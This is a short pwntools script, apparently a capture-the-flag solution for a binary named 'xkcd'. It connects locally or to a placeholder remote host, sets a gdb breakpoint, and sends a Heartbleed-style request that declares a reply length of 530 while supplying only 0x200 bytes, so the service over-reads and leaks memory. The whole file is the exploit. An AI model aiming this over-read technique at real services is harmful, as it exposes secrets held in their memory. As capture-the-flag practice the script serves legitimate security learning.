#!/usr/bin/env python3

from pwn import *

exe = ELF("./xkcd")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    gdb.attach(r, gdbscript = 'b *0x40108e')
    r.sendline("SERVER, ARE YOU STILL THERE? IF SO, REPLY \"" + "A" * 0x200 + "\"" + "AAAA(530)")

    r.interactive()


if __name__ == "__main__":
    main()
